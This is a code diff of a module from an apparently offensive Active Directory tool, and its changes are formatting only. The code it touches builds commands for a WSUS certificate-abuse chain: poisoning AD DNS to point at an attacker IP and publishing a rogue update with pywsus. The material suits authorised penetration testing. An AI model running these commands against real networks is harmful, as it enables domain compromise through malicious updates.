@@ -5,8 +5,8 @@ from pathlib import Path
 from typing import TYPE_CHECKING
 
 from admapper.adcs.runner import run_enroll_hijack
-from admapper.support.output import print_info, print_success, print_warning
 from admapper.creds.common import pick_dc_ip, resolve_dc_fqdn
+from admapper.support.output import print_info, print_success, print_warning
 from admapper.wsus.analyze import get_wsus_op
 
 if TYPE_CHECKING:
@@ -47,11 +47,11 @@ def build_pywsus_publish_commands(
     pfx = Path(pfx_path)
     base = f"https://{wsus_host}:{wsus_port}" if wsus_port != 8530 else f"https://{wsus_host}:8530"
     return [
-        f"# ESC1 WSUS — Server Auth cert for WSUS endpoint (not PKINIT login)",
+        "# ESC1 WSUS — Server Auth cert for WSUS endpoint (not PKINIT login)",
         f"# PFX (Subject/SAN = {target_fqdn}): {pfx}",
         "# 1) Optional: poison AD DNS so DC resolves your rogue WSUS host",
         f"#    dnstool.py -u '<owned_user>' -p '<pass>' --record {target_fqdn} --action add --data <attacker_ip>",
-        f"#    or: wsuks / SharpWSUS with machine account + SeMachineAccountPrivilege",
+        "#    or: wsuks / SharpWSUS with machine account + SeMachineAccountPrivilege",
         "# 2) Rogue WSUS publish (pywsus / wsuks) with enrolled PFX",
         f"python3 pywsus.py -s {base} -c '{pfx}' publish -t {target_fqdn}",
         f"# Alt with creds: python3 pywsus.py -u '<user>@{domain}' -p '<pass>' -s {base} -c '{pfx}' publish -t {target_fqdn}",
@@ -78,8 +78,12 @@ def write_wsus_publish_script(
     host = wsus_host or resolve_wsus_host(session)
     cert_dns = host if "." in host else f"dc01.{domain}"
     if pfx_path is None:
-        existing = sorted((ws_path / "certs").glob("*.pfx"), key=lambda p: p.stat().st_mtime, reverse=True)
-        pfx_path = existing[0] if existing else ws_path / "certs" / f"{cert_dns.replace('.', '_')}.pfx"
+        existing = sorted(
+            (ws_path / "certs").glob("*.pfx"), key=lambda p: p.stat().st_mtime, reverse=True
+        )
+        pfx_path = (
+            existing[0] if existing else ws_path / "certs" / f"{cert_dns.replace('.', '_')}.pfx"
+        )
 
     lines = build_pywsus_publish_commands(
         wsus_host=host.split(":")[0],
@@ -116,8 +120,12 @@ def run_wsus_cert_chain(
     if session.workspace is None:
         raise RuntimeError("no active workspace")
 
-    from admapper.support.connectivity import TargetUnreachableError, format_unreachable_message, require_target_reachable
     from admapper.models.workspace import OperationMode
+    from admapper.support.connectivity import (
+        TargetUnreachableError,
+        format_unreachable_message,
+        require_target_reachable,
+    )
 
     if enroll and session.workspace.mode == OperationMode.AUTO:
         try:
@@ -141,7 +149,9 @@ def run_wsus_cert_chain(
 
     hijack_op = resolve_hijack_op_id(session) or "postex-010"
 
-    existing = sorted((ws_path / "certs").glob("*.pfx"), key=lambda p: p.stat().st_mtime, reverse=True)
+    existing = sorted(
+        (ws_path / "certs").glob("*.pfx"), key=lambda p: p.stat().st_mtime, reverse=True
+    )
     if existing:
         pfx_path = existing[0]
         print_info(f"using existing PFX → {pfx_path}")
